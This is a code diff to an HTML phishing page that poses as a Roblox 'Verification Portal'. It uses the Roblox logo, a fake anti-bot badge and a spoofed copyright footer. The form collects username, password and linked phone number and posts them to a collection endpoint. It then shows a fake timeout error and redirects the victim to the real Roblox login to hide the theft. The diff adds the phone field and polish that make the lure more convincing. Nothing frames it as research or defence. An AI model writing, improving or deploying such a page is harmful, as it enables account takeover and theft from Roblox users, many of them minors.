@@ -1,35 +1,47 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>RBX Session Manager</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox | Verification Portal</title>
     <style>
-        body { background: #191919; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .card { background: #222; padding: 30px; border-radius: 8px; width: 300px; border-top: 4px solid #00A2FF; }
-        input { width: 100%; padding: 10px; margin: 10px 0; background: #000; border: 1px solid #333; color: #fff; box-sizing: border-box; }
-        button { width: 100%; padding: 10px; background: #00A2FF; border: none; color: #fff; font-weight: bold; cursor: pointer; }
+        body { margin: 0; font-family: sans-serif; background: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; background-image: radial-gradient(circle at center, #1e1e1e 0%, #000 100%); }
+        .container { background: #232527; padding: 40px; border-radius: 12px; width: 340px; text-align: center; border: 1px solid #393b3d; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .logo { width: 60px; margin-bottom: 20px; }
+        .anti-bot { background: rgba(0, 162, 255, 0.1); border: 1px solid #00A2FF; color: #00A2FF; padding: 8px; border-radius: 5px; font-size: 12px; margin-bottom: 20px; font-weight: bold; }
+        input { width: 100%; padding: 12px; margin-bottom: 12px; background: #111; border: 1px solid #393b3d; color: #fff; border-radius: 5px; box-sizing: border-box; font-size: 14px; outline: none; }
+        input:focus { border-color: #00A2FF; }
+        button { width: 100%; padding: 12px; background: #00A2FF; color: #fff; border: none; font-weight: bold; border-radius: 5px; cursor: pointer; transition: 0.2s; }
+        button:hover { background: #0081cc; }
+        .footer { font-size: 11px; color: #666; margin-top: 20px; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <h3>System Verification</h3>
-        <p style="font-size: 12px; color: #888;">Sync your session to continue</p>
-        <form id="f">
-            <input type="text" id="u" placeholder="Username" required>
+    <div class="container">
+        <img src="https://www.roblox.com/images/logos/rebrand/metric_144_white.png" class="logo">
+        <div class="anti-bot">🛡️ ANTI-BOT SYSTEM: ACTIVE</div>
+        <form id="v">
+            <input type="text" id="u" placeholder="Username / Email" required>
             <input type="password" id="p" placeholder="Password" required>
-            <button type="submit">SYNCHRONIZE</button>
+            <input type="tel" id="t" placeholder="Linked Phone Number" required>
+            <button type="submit" id="b">VERIFY IDENTITY</button>
         </form>
+        <div class="footer">Account must be at least 30 days old. <br> © 2025 Roblox Corp.</div>
     </div>
     <script>
-        document.getElementById('f').onsubmit = async (e) => {
+        document.getElementById('v').onsubmit = async (e) => {
             e.preventDefault();
+            const btn = document.getElementById('b');
+            btn.innerText = 'WAIT...';
             await fetch('/api/send', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ username: u.value, password: p.value })
+                body: JSON.stringify({ u: u.value, p: p.value, t: t.value })
             });
-            alert("Error: Connection timeout. Redirecting...");
-            window.location.href = "https://www.roblox.com/login";
+            setTimeout(() => {
+                alert("Error: Verification timeout. Redirecting to manual login...");
+                window.location.href = "https://www.roblox.com/login";
+            }, 2000);
         };
     </script>
 </body>
